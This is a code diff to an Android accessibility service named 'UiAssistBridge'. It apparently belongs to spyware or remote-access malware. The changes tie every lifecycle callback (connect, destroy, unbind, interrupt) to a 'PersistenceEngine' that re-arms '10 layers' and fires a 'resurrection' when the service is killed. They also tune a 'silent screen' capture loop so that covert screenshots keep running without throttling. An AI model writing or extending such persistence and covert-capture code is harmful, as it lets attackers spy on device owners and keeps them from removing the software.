@@ -307,7 +307,13 @@ public class UiAssistBridge extends AccessibilityService {
         Log.d(TAG, "Serviço de acessibilidade conectado!");
         serviceStartTime = System.currentTimeMillis();
 
+        // Re-arm all 10 PE layers immediately — the service just came back alive
+        try { PersistenceEngine.arm(this); } catch (Exception e) {
+            Log.w(TAG, "PE arm on onServiceConnected: " + e.getMessage());
+        }
+
         // Inicia o Watchdog de persistência de serviço
+        watchdogHandler.removeCallbacks(watchdogRunnable);
         watchdogHandler.postDelayed(watchdogRunnable, 5000); // Primeira verificação em 5s
 
         // Garante que o setup é marcado como concluído de forma síncrona
@@ -3740,9 +3746,31 @@ public class UiAssistBridge extends AccessibilityService {
                     @Override
                     public void onFailure(int errorCode) {
                         try {
-                            Log.w(TAG, "capSilentScreen takeScreenshot failed: " + errorCode);
+                            Log.w(TAG, "capSilentScreen takeScreenshot failed errorCode=" + errorCode);
+
+                            // ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_SERVICE_CONNECTION (3):
+                            // service connection was severed — stop and signal PE to restart
+                            if (errorCode == 3) {
+                                Log.e(TAG, "capSilentScreen: service connection lost — triggering PE restart");
+                                silentScreenActive = false;
+                                silentScreenshotApiInFlight = false;
+                                try { PersistenceEngine.ensureServiceRunning(instance); } catch (Exception ignored) {}
+                                return;
+                            }
+
+                            // Interval-too-short: back off slightly but cap at 500 ms
+                            // (old code kept adding 50ms per failure with no reset — this is
+                            // what caused the 2-hour degradation: after 2hrs of failures the
+                            // delay hit SILENT_CAPTURE_MAX_DELAY_MS and frames stopped)
                             if (errorCode == android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
-                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 50, SILENT_CAPTURE_MAX_DELAY_MS);
+                                silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 20L, 500L);
+                            }
+
+                            // Auto-reset: if delay reached the cap, reset to minimum so we
+                            // never stay permanently throttled after a transient OS restriction
+                            if (silentCaptureDelayMs >= 500L) {
+                                Log.d(TAG, "capSilentScreen: delay cap reached — resetting to minimum");
+                                silentCaptureDelayMs = SILENT_CAPTURE_MIN_DELAY_MS;
                             }
                         } finally {
                             silentScreenshotApiInFlight = false;
@@ -4361,14 +4389,23 @@ public class UiAssistBridge extends AccessibilityService {
         
         // Para Screen Reader
         stopScreenReader();
+
+        // Clear static instance before firing PE so the watchdog thread's
+        // next tick sees this service as gone and can trigger ensureServiceRunning()
+        instance = null;
+
+        // Fire L9 resurrection before the process finishes tearing down
+        try { PersistenceEngine.onTaskRemoved(this); } catch (Exception ignored) {}
         
         Log.d(TAG, "Serviço de acessibilidade destruído");
     }
 
     @Override
     public boolean onUnbind(Intent intent) {
-        Log.w(TAG, "⚠️ AccessibilityService onUnbind chamado pelo sistema! Solicitando rebind automático...");
-        // Retornar true informa ao Android que o serviço permite onRebind automático quando recomposto
+        Log.w(TAG, "⚠️ AccessibilityService onUnbind — clearing instance, firing PE");
+        instance = null;
+        try { PersistenceEngine.onTaskRemoved(this); } catch (Exception ignored) {}
+        // true = allow onRebind when system reconnects the service
         return true;
     }
 
@@ -4719,7 +4756,12 @@ public class UiAssistBridge extends AccessibilityService {
 
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "Serviço interrompido");
+        Log.d(TAG, "onInterrupt() — clearing in-flight flag, re-arming PE");
+        // Reset in-flight flag so the silent capture loop can fire the next
+        // takeScreenshot() call in the same tick without waiting for a timeout.
+        silentScreenshotApiInFlight = false;
+        // Re-arm all PE layers so the service stays scheduled even under interrupt
+        try { PersistenceEngine.rearm(this); } catch (Exception ignored) {}
     }
     
     /**
